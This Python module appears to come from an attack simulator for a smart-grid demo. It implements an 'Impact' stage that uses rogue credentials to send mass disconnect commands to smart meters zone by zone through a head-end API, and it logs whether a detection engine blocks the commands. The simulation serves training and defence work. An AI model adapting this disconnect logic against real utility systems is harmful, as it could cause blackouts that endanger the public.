"""
APT Simulator — Stage 6: Impact
=================================
MITRE ATT&CK for ICS: T0826 — Loss of Availability

The final stage: mass remote-disconnect of smart meters across all
zones, causing a cascading blackout. This is the most visually
dramatic stage — the dashboard's city grid map shows meters flipping
from green to red in waves.

When detection is enabled, the HES command engine blocks the
disconnect commands once the composite risk score exceeds the
threshold, demonstrating how detection prevents impact.
"""

from __future__ import annotations

import asyncio
import logging

import httpx

from shared import config
from shared.models import AttackStage
from attacker.event_log import EventLog

logger = logging.getLogger(__name__)

STAGE = AttackStage.IMPACT
TECHNIQUE_ID = "T0826"
TACTIC = "Impact"


async def execute(
    event_log: EventLog,
    stage_config: dict = None,
    credentials: dict = None,
) -> dict:
    """
    Execute the Impact stage.
    
    Sends mass disconnect commands to all meters, zone by zone,
    via the HES API. Uses compromised/rogue credentials.
    
    If detection is active and has blocked the compromised operator,
    the disconnect commands will be rejected (HTTP 403).
    """
    stage_config = stage_config or {}
    credentials = credentials or {}

    hes_url = config.HES_URL
    zone_order = stage_config.get("zone_order", ["A", "B", "C", "D", "E", "F"])
    batch_size = stage_config.get("disconnect_batch_size", 100)
    batch_delay = stage_config.get("batch_delay_seconds", 3)
    operator_id = credentials.get("rogue_username", "svc_backup")

    logger.info(f"[IMPACT] Initiating mass meter disconnect across {len(zone_order)} zones")
    await event_log.log_event(
        stage=STAGE,
        technique_id=TECHNIQUE_ID,
        tactic=TACTIC,
        target="All meters",
        action="Mass disconnect attack initiated",
        details={
            "zone_order": zone_order,
            "batch_size": batch_size,
            "operator_id": operator_id,
        },
    )

    zone_results = {}
    total_disconnected = 0
    total_blocked = 0
    attack_blocked = False

    async with httpx.AsyncClient(timeout=30.0) as client:
        for zone in zone_order:
            logger.warning(f"[IMPACT] Targeting zone {zone}...")

            await event_log.log_event(
                stage=STAGE,
                technique_id=TECHNIQUE_ID,
                tactic=TACTIC,
                target=f"Zone {zone}",
                action=f"Mass disconnect targeting zone {zone}",
                details={"zone": zone, "operator_id": operator_id},
            )

            try:
                resp = await client.post(
                    f"{hes_url}/api/meters/mass-command",
                    json={
                        "zone": zone,
                        "command_type": "disconnect",
                        "operator_id": operator_id,
                        "batch_size": batch_size,
                        "batch_delay": 0.1,  # Fast for demo
                    },
                )

                if resp.status_code == 200:
                    result = resp.json()
                    zone_results[zone] = result
                    disconnected = result.get("disconnected", 0)
                    blocked = result.get("blocked", 0)
                    total_disconnected += disconnected
                    total_blocked += blocked

                    if blocked > 0:
                        attack_blocked = True
                        await event_log.log_event(
                            stage=STAGE,
                            technique_id=TECHNIQUE_ID,
                            tactic=TACTIC,
                            target=f"Zone {zone}",
                            action=f"BLOCKED: {blocked} disconnects blocked by detection engine",
                            details=result,
                            success=False,
                        )
                        logger.info(f"[IMPACT] Zone {zone}: {blocked} commands BLOCKED by detection")
                    else:
                        await event_log.log_event(
                            stage=STAGE,
                            technique_id=TECHNIQUE_ID,
                            tactic=TACTIC,
                            target=f"Zone {zone}",
                            action=f"Zone {zone} DISCONNECTED: {disconnected} meters down",
                            details=result,
                        )
                        logger.warning(f"[IMPACT] Zone {zone}: {disconnected} meters DISCONNECTED")

                elif resp.status_code == 403:
                    attack_blocked = True
                    zone_results[zone] = {"blocked": True, "status": 403}
                    await event_log.log_event(
                        stage=STAGE,
                        technique_id=TECHNIQUE_ID,
                        tactic=TACTIC,
                        target=f"Zone {zone}",
                        action=f"ATTACK BLOCKED: Detection engine prevented disconnect in zone {zone}",
                        success=False,
                    )
                    logger.info(f"[IMPACT] Zone {zone}: COMPLETELY BLOCKED (403)")

            except httpx.ConnectError:
                logger.error(f"[IMPACT] Cannot connect to HES for zone {zone}")
                zone_results[zone] = {"error": "connection_failed"}

            # Delay between zone attacks
            await asyncio.sleep(batch_delay)

            # If attack is being blocked, log it and continue (for demo visibility)
            if attack_blocked:
                await event_log.log_event(
                    stage=STAGE,
                    technique_id=TECHNIQUE_ID,
                    tactic=TACTIC,
                    target="All meters",
                    action="ATTACK MITIGATED: Detection engine blocking further disconnect commands",
                    details={"zones_attempted": list(zone_results.keys())},
                    success=False,
                )

    summary = {
        "success": not attack_blocked,
        "attack_blocked": attack_blocked,
        "total_disconnected": total_disconnected,
        "total_blocked": total_blocked,
        "zones": zone_results,
    }

    if attack_blocked:
        await event_log.log_event(
            stage=STAGE,
            technique_id=TECHNIQUE_ID,
            tactic=TACTIC,
            target="All meters",
            action=f"IMPACT MITIGATED: {total_blocked} commands blocked, {total_disconnected} executed before detection",
            details=summary,
            success=False,
        )
        logger.info(f"[IMPACT] MITIGATED: {total_blocked} blocked, {total_disconnected} executed")
    else:
        await event_log.log_event(
            stage=STAGE,
            technique_id=TECHNIQUE_ID,
            tactic=TACTIC,
            target="All meters",
            action=f"IMPACT SUCCESSFUL: {total_disconnected} meters disconnected across all zones",
            details=summary,
        )
        logger.warning(f"[IMPACT] SUCCESSFUL: {total_disconnected} meters disconnected — BLACKOUT")

    return summary
